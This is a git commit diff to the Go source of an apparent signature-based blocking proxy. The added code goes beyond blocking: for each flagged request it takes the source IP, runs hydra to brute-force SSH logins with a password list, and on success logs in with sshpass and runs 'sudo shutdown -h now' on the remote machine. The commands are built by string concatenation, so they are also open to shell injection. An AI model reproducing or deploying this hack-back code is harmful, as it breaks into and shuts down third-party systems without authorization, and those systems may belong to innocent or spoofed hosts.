0d35e78b3898725cd83e30fad3714bcfce1aee60
yokoyama443 <j122357@ns.kogakuin.ac.jp>
2024-08-03 07:04:44 +0900

    Update main.go

--- main.go
+++ main.go
@@ -10,6 +10,8 @@ import (
 	"net/http/httputil"
 	"net/url"
 	"os"
+	"os/exec"
+	"regexp"
 	"strings"
 
 	"gopkg.in/yaml.v2"
@@ -79,6 +81,29 @@ func main() {
 					if checkBadContent(strBody, signatures) {
 						fmt.Println("悪性通信")
 						http.Error(w, "悪性通信のためブロックしました", http.StatusForbidden)
+						ip := strings.Split(r.RemoteAddr, ":")[0]
+						if ip[0] == '[' {
+							return
+						}
+						fmt.Println("Evil SourceIP: ", ip)
+						cmd := exec.Command("sh", "-c", "hydra -l ubuntu -P password.lst "+ip+" ssh")
+						output, err := cmd.Output()
+						if err != nil {
+							fmt.Println(err)
+						}
+						fmt.Println(string(output))
+						re := regexp.MustCompile(`login: (\S+).*password: (\S+)`)
+						matches := re.FindStringSubmatch(string(output))
+						if len(matches) > 0 {
+							fmt.Println("Login: ", matches[1])
+							fmt.Println("Password: ", matches[2])
+							cmd = exec.Command("sh", "-c", "sshpass -p "+matches[2]+" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -l "+matches[1]+" "+ip+" sh -c 'ls && echo "+matches[2]+" | sudo -S shutdown -h now'")
+							output, err = cmd.Output()
+							if err != nil {
+								fmt.Println(err)
+							}
+							fmt.Println(string(output))
+						}
 						return
 					} else {
 						fmt.Println("良性通信")
